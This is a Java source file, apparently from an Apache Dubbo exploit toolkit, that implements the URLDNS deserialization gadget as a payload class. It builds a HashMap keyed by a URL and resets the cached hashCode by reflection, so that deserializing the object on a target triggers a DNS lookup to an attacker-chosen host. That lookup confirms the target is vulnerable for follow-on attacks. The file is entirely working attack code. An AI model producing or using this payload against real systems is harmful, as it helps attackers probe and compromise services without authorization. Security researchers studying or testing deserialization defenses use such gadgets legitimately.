package com.threedr3am.exp.dubbo.payload.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;


public class URLDNS implements Payload {

  private String[] args;

  /**
   *
   * @param args
   *
   * arg[0]=dns server url
   *
   * @return
   * @throws Exception
   */
  @Override
  public Object getPayload(String[] args) throws Exception {
    if (this.args != null)
      args = this.args;
    //Avoid DNS resolution during payload creation
    //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
    URLStreamHandler handler = new SilentURLStreamHandler();

    HashMap ht = new HashMap(); // HashMap that will contain the URL
    URL u = new URL(null, args[0], handler); // URL to use as the Key
    ht.put(u,
        args[0]); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

    Reflections.setFieldValue(u, "hashCode",
        -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

    return ht;
  }

  @Override
  public void injectDefaultArgs(String[] args) {
    this.args = args;
  }

  class SilentURLStreamHandler extends URLStreamHandler {

    protected URLConnection openConnection(URL u) throws IOException {
      return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
      return null;
    }
  }

}
